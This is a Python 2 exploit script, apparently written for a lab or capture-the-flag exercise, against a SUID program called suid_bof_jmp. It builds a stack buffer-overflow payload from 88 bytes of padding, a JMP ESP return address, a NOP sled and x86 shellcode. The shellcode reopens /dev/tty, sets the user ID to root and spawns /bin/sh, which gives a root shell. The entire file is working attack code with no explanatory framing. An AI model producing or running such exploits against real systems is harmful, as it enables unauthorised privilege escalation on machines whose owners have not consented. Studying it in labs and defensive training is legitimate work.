#!/usr/bin/env python2
# suid_bof_jmp exploit using JMP ESP for root shell

import struct
import sys

# 1. Address of the JMP %ESP instruction
jmp_esp_addr = 0x8049166
jmp_esp = struct.pack('<I', jmp_esp_addr)

# 2. Use the shellcode that properly handles SUID context
# This shellcode sets up the TTY and handles privilege escalation
shellcode = (
    b'\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53'
    b'\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0'
    b'\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58'
    b'\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50'
    b'\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
)

# 3. Build the payload
padding = b"A" * 88
nop_sled = b"\x90" * 8  # Reduced NOP sled to accommodate larger shellcode

# Final payload
payload = padding + jmp_esp + nop_sled + shellcode

# Output payload (for use with command substitution)
if len(sys.argv) > 1 and sys.argv[1] == '--raw':
    sys.stdout.write(payload)
else:
    print(payload)

